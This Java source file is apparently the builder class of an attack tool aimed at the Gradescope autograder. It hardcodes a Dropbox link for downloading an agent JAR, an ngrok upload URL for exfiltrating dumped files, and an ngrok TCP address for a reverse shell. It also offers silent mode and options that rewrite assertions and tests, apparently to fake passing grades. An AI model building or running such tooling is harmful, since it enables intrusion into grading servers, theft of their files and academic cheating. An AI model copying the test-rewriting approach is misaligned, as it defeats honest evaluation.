package gradeskope;

import gradeskope.shell.RSHellTargetType;
import java.net.MalformedURLException;
import java.net.URL;

public class AgentBuilder {

  private boolean enableDump = false;
  private boolean enableAssertTransform = false;
  private boolean enableTestTransform = false;
  private boolean silent = false;
  private boolean enableReverseShell;
  private RSHellTargetType reverseShellTarget = RSHellTargetType.CURRENT_PROCESS;
  private String reverseShellURL;
  private String targetProcessMatchString = null;
  private URL agentDownloadURL;
  private URL dumpDestinationURL;
  private String zipName = "dump-archive.zip";

  {
    try {
      agentDownloadURL =
          new URL("https://www.dropbox.com/scl/fi/jtb5t6ye8of8zftzefeug/GradescopeAgent-1.1.jar?rlkey=8j64wf6wohebuzdu63hb9x0lx&st=nzgsvkyo&dl=1");
      dumpDestinationURL = new URL("https://e6d0-152-2-31-194.ngrok-free.app/upload");
      reverseShellURL = "tcp://0.tcp.ngrok.io:11491";
    } catch (MalformedURLException e) {
      throw new RuntimeException(e);
    }
  }

  public AgentBuilder() {

  }

  public AgentManager buildAgent() {
    return new AgentManager(enableDump,
        enableAssertTransform,
        enableTestTransform,
        silent,
        enableReverseShell,
        reverseShellTarget,
        reverseShellURL,
        agentDownloadURL.toString(),
        dumpDestinationURL.toString(),
        zipName,
        targetProcessMatchString);
  }

  public AgentBuilder enableDumping(boolean dumpingEnabled) {
    enableDump = dumpingEnabled;
    return this;
  }

  public AgentBuilder enableAssertTransform(boolean assertTransformEnabled) {
    enableAssertTransform = assertTransformEnabled;
    return this;
  }

  public AgentBuilder enableTestTransform(boolean testTransformEnabled) {
    enableTestTransform = testTransformEnabled;
    return this;
  }

  public AgentBuilder enableSilentMode(boolean silent) {
    this.silent = silent;
    return this;
  }

  public AgentBuilder enableReverseShell(boolean reverseShellEnabled) {
    this.enableReverseShell = reverseShellEnabled;
    return this;
  }

  public AgentBuilder reverseShellTarget(RSHellTargetType reverseShellTargetMode) {
    this.reverseShellTarget = reverseShellTargetMode;
    return this;
  }

  public AgentBuilder setReverseShellURL(String reverseShellURL) {
    if (!reverseShellURL.startsWith("tcp://")) {
      throw new RuntimeException("URL must begin with tcp://");
    }
    this.reverseShellURL = reverseShellURL;
    return this;
  }


  public AgentBuilder setTargetProcessMatchString(String targetProcessMatchString) {
    this.targetProcessMatchString =  targetProcessMatchString;
    return this;
  }

  public AgentBuilder setDumpDestinationURL(String dumpDestinationURL) {
    try {
      return setDumpDestinationURL(new URL(dumpDestinationURL));
    } catch (MalformedURLException e) {
      throw new RuntimeException(e);
    }
  }

  public AgentBuilder setDumpDestinationURL(URL dumpDestinationURL) {
    this.dumpDestinationURL = dumpDestinationURL;
    return this;
  }

  public AgentBuilder setAgentDownloadURL(String agentDownloadURL) {
    try {
      return setAgentDownloadURL(new URL(agentDownloadURL));
    } catch (MalformedURLException e) {
      throw new RuntimeException(e);
    }
  }

  public AgentBuilder setAgentDownloadURL(URL agentDownloadURL) {
    this.agentDownloadURL = agentDownloadURL;
    return this;
  }

  public AgentBuilder setZipName(String zipName) {
    this.zipName = zipName;
    return this;
  }
}
